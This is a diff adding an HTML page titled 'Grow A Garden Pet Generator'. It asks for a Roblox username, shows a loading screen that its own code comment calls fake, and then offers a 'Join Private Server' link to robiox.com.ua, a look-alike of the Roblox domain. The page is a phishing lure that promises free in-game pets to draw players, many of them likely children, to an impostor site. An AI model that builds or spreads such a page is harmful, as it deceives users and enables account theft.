@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Grow a garden </title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grow A Garden Pet Generator</title>
+  <style>
+    body {
+      background: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+
+    h1 {
+      margin-top: 40px;
+      font-size: 2.5em;
+      color: cyan;
+      text-shadow: 0 0 10px cyan, 0 0 20px cyan;
+    }
+
+    .username-label {
+      margin-top: 10px;
+      font-size: 1em;
+      display: block;
+    }
+
+    input {
+      margin: 15px auto;
+      padding: 12px;
+      width: 250px;
+      border: 2px solid cyan;
+      border-radius: 6px;
+      background: #111;
+      color: white;
+      font-size: 1em;
+      display: block;
+    }
+
+    .pets {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      justify-content: center;
+      max-width: 400px;
+      margin: 20px auto;
+    }
+
+    .pet {
+      background: #111;
+      border: 2px solid cyan;
+      padding: 15px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .pet:hover {
+      background: cyan;
+      color: black;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 12px 24px;
+      border: 2px solid cyan;
+      background: transparent;
+      color: white;
+      font-size: 1.1em;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: cyan;
+      color: black;
+    }
+
+    #loading, #result {
+      display: none;
+      margin-top: 30px;
+      font-size: 1.2em;
+    }
+
+    a.server-link {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 12px 20px;
+      background: cyan;
+      color: black;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold;
+      box-shadow: 0 0 10px cyan, 0 0 20px cyan;
+    }
+
+    a.server-link:hover {
+      background: #00ffffcc;
+    }
+  </style>
+</head>
+<body>
+  <h1>Pet Generator</h1>
+  <label class="username-label">Put Roblox username in box:</label>
+  <input type="text" id="username" placeholder="Enter Roblox Username">
+
+  <div class="pets">
+    <div class="pet">🦝 Raccoon</div>
+    <div class="pet">🦋 Butterfly</div>
+    <div class="pet">🐝 Dragonfly</div>
+    <div class="pet">👾 Mimic</div>
+  </div>
+
+  <button onclick="generatePet()">GENERATE</button>
+
+  <div id="loading">⏳ Generating your pet...</div>
+  <div id="result">
+    🎉 Your pet is ready!  
+    <br>
+    <a class="server-link" href="https://www.robiox.com.ua/games/126884695634066/Grow-a-Garden?privateServerLinkCode=91272229525749848755759900224300" target="_blank">
+      Join Private Server
+    </a>
+  </div>
+
+  <script>
+    function generatePet() {
+      let username = document.getElementById("username").value;
+      if(username.trim() === "") {
+        alert("Please enter your Roblox username first!");
+        return;
+      }
+
+      document.getElementById("loading").style.display = "block";
+      document.getElementById("result").style.display = "none";
+
+      setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("result").style.display = "block";
+      }, 3000); // fake loading for 3 seconds
+    }
+  </script>
+</body>
+</html>
+<!-- partial -->
+  
+</body>
+</html>
